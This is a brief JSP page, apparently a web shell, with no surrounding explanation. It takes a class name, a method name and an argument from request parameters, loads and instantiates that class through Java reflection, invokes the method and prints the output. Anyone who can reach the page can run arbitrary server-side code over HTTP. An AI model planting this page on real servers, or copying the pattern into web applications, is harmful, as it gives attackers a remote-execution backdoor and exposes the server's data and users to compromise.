<%@ page import="java.lang.reflect.*" %>
<%
String cls = request.getParameter("cls");
String method = request.getParameter("m");
Class c = Class.forName(cls);
Method m = c.getMethod(method, String.class);
Object o = c.newInstance();
String result = (String) m.invoke(o, request.getParameter("arg"));
out.println(result);
%>
